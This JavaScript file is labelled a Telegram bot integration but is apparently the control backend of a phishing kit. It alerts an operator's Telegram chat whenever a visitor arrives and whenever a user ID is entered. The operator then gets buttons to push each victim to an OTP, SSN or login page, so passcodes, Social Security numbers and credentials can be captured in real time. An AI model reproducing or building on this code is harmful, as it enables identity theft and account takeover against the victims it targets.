// Telegram Bot Integration
// Sends notifications to Telegram and handles webhook commands

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Your Telegram user ID

// Send message to Telegram
export async function sendTelegramMessage(text, chatId = null, replyMarkup = null) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('[telegram] Bot token not configured');
    return null;
  }

  const targetChatId = chatId || TELEGRAM_CHAT_ID;
  if (!targetChatId) {
    console.warn('[telegram] Chat ID not configured');
    return null;
  }

  try {
    const payload = {
      chat_id: targetChatId,
      text: text,
      parse_mode: 'HTML'
    };
    
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await response.json();
    if (data.ok) {
      console.log('[telegram] Message sent successfully to chat:', targetChatId);
      return data.result;
    } else {
      console.error('[telegram] Error sending message:', JSON.stringify(data, null, 2));
      console.error('[telegram] Error code:', data.error_code);
      console.error('[telegram] Error description:', data.description);
      return null;
    }
  } catch (error) {
    console.error('[telegram] Error sending message:', error);
    return null;
  }
}

// Send visitor notification with page selection buttons
export async function notifyVisitor(visitorId = null) {
  const visitorInfo = visitorId ? `\nVisitor ID: <code>${visitorId}</code>` : '';
  const message = `🔔 <b>NEW VISITOR ON SITE</b>${visitorInfo}\n\n` +
    `Time: ${new Date().toLocaleString()}\n\n` +
    `Select page to redirect:`;
  
  // Inline keyboard with buttons
  const replyMarkup = {
    inline_keyboard: [
      [
        { text: 'OTP PAGE', callback_data: 'redirect_otp' },
        { text: 'SSN PAGE', callback_data: 'redirect_ssn' }
      ],
      [
        { text: 'LOGIN PAGE', callback_data: 'redirect_login' }
      ]
    ]
  };
  
  return await sendTelegramMessage(message, null, replyMarkup);
}

// Send notification about new activity
export async function notifyActivity(activity) {
  if (activity.type === 'userid') {
    const message = `🔔 <b>USER ID ENTERED</b>\n\n` +
      `User ID: <code>${activity.userId}</code>\n` +
      `Activity ID: <code>${activity.id}</code>\n` +
      `Time: ${new Date(activity.timestamp).toLocaleString()}\n\n` +
      `Select redirect page:`;
    
    // Inline keyboard with buttons for this specific activity
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP PAGE', callback_data: `approve_otp_${activity.id}` },
          { text: 'SSN PAGE', callback_data: `approve_ssn_${activity.id}` }
        ],
        [
          { text: 'LOGIN PAGE', callback_data: `approve_login_${activity.id}` }
        ]
      ]
    };
    
    return await sendTelegramMessage(message, null, replyMarkup);
  }
  return null;
}


